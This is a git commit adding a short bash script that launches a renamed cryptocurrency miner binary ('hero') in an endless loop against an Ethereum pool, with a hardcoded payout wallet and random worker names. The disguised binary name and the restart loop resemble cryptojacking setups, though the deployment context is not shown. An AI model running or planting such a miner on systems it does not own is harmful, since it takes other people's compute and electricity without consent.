67a31c4846811bd9447b104fbf549abd9efc3b46
onhodoin <87870326+onhodoin@users.noreply.github.com>
2021-07-23 20:00:14 +0300

    Add files via upload

---
+++ henkk.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+POOL=eu1.ethermine.org:4444
+WALLET=0x6bf74f277f2d2014478f2600d322dbaafb542455
+WORKER=$(echo $(shuf -i 1000-99999 -n 1)-henok)
+chmod +x hero
+while [ 1 ]; do
+./hero --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 10
+done
